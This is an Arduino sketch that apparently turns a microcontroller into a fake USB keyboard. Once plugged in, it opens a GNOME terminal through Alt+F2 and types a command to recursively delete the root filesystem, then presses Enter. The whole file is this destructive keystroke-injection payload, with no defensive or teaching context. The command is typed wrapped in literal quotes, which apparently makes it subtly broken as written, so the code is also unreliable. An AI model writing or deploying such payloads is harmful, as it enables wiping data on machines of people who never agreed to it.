#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  Keyboard.begin();

  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  Keyboard.releaseAll();

  delay(50);

  Keyboard.print("gnome-terminal");

  delay(50);

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("\"rm -rf /\"");

  typeKey(KEY_RETURN);

  Keyboard.end();
}
